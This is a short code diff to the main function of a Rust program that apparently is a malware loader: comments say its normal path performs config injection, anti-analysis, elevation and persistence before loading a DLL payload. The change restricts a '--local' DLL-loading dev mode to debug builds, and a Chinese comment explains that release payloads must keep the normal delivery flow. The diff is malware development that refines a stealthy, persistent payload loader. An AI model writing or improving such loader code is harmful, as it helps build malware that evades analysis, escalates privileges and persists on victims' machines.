@@ -23,10 +23,18 @@ fn main() {
 
     let args: Vec<String> = env::args().collect();
     let is_boot = args.iter().any(|a| a == "--boot");
+    // Dev mode: --local <path> skips config injection, anti-analysis, elevation,
+    // persistence。仅 debug_assertions 构建可用 —— 发布载荷禁止绕过正常下发
+    // 流程（任何拿到二进制的人都可 --local 加载任意 DLL，等于把 loader 变成
+    // 任意代码执行器；同时 dev 配置写死 127.0.0.1:5000 也毫无用处）。
+    #[cfg(debug_assertions)]
     let local_path = args.iter().position(|a| a == "--local").and_then(|i| args.get(i + 1)).cloned();
+    #[cfg(not(debug_assertions))]
+    let local_path: Option<String> = None;
     log!("[2/10] args parsed, is_boot={}, local={}", is_boot, local_path.is_some());
 
-    // Dev mode: --local <path> skips config injection, anti-analysis, elevation, persistence
+    // Dev mode: --local <path> skips config injection, anti-analysis, elevation,
+    // persistence。仅 debug_assertions 构建可用（见上方 local_path 解析）。
     if let Some(ref path) = local_path {
         log!("[DEV] --local mode: loading {} directly", path);
         let dll_bytes = match std::fs::read(path) {
